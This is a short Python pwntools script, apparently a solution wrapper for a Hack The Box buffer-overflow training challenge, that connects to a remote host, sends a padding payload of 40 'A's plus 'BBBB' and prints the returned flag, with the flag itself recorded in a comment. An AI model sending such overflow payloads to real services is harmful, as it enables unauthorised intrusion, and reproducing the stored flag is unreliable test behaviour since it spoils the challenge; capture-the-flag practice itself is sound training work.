#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '94.237.57.115'
PORT = 38907

r = remote(IP, PORT)

# Craft payload
payload = b'A' * 40 + b'BBBB' # Change the number of "A"s

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')

# Flag --> HTB{b0f_tut0r14l5_4r3_g00d}